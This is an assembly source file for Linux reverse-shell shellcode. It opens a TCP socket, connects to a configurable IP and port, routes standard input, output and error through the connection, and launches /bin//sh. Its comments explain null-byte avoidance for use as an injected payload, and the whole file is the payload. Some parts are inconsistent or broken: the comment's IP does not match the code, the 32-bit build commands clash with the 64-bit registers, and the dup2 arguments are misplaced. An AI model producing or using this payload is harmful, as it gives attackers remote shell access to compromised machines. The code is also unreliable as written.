; Port numbers and IP addresses are made to be as simple to change as possible
; without adding too many extra instructions

; Compile to test with
; nasm -f elf32 socket_execve.asm
; ld -m elf_i386 socket_execve.o -o socket_execve

section .text
	global _start

_start:
	; Make room on stack for shellcode to run smoothly
	sub sp, 0x0202
	; Create a stack frame
	mov rbp, rsp
	sub sp, 0x0202

; Create the socket object
	
	; Setup registers
	xor rax, rax
	xor rdi, rdi
	xor rsi, rsi
	xor rdx, rdx

	; socket syscall number (41)
	mov al, 41

	; domain: AF_INET for IPV4
	mov dil, 2

	; type: SOCK_STREAM for TCP
	mov sil, 1

	; protocol: TCP (can also be 0)
	mov dl, 6

	; socket syscall
	syscall

	; save the sockfd
	mov [rbp + 0x4], rax

; Create the sockaddr_in struct on the stack
	
	; sin_family: AF_INET
	xor rax, rax
	mov al, 2
	mov word [rbp + 0x8], ax

	; sin_port: change as needed
	mov ax, 2468
	xchg ah, al
	mov word [rbp + 0xa], ax

	; sin_addr uses 192.168.1.0 as an example but can be replaced as needed
	; use a mov <register>, 1 | dec <register> instruction if zero is needed to avoid null bytes

	mov al, 196
	mov ah, 168

	mov word [rbp + 0xc], ax

	mov al, 1
	mov ah, 1
	dec ah

	mov word [rbp + 0xe], ax

	; Connect syscall number (42)
	xor rax, rax
	mov al, 42

	; sockfd
	mov edi, dword [rbp + 0x4]

	; sockaddr struct
	lea rsi, [rbp + 0x8]

	; addrlen
	mov dl, 16

	; connect syscall
	syscall

; Foward stdout/in/error through the socket
	
	; Setup registers
	xor rax, rax
	xor rsi, rsi

	; dup2 syscall number (33)
	mov al, 33

	; oldfd
	mov edx, dword [rbp + 0x4]

	; newfd
	mov sil, 1
	dec sil

	; stdout
	syscall

	; stdin
	mov al, 33
	mov sil, 1
	syscall

	; stderror
	mov al, 33
	mov sil, 2
	syscall

; Execve
	; execve syscall number (59)
	mov al, 59

	; env
	xor rdx, rdx

	; argv
	xor rsi, rsi

	;filename
	push rsi 
	mov rdi, 0x68732f2f6e69622f
	push rdi
	lea rdi, [rsp]

	; execve syscall
	syscall
